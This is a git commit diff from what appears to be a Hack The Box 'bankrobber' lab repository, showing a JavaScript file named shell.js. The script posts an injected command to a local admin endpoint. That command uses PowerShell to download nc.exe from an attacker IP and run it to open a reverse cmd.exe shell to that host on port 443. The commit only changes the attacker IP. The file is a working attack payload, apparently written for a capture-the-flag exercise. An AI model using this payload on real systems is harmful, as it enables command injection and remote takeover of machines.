03a706c4b7a882ef6f2cad8447c95a7d5fcceb6d
Oredreim <ccpa1801@gmail.com>
2021-11-28 14:01:14 -0800

    bankrobber

--- htb/bankrobber/content/shell.js
+++ htb/bankrobber/content/shell.js
@@ -1,5 +1,5 @@
 var request = new XMLHttpRequest();
-var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.4/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.16.4 443';
+var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.8/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.16.8 443';
 request.open('POST', 'http://localhost/admin/backdoorchecker.php/', true);
 request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 request.send(params);
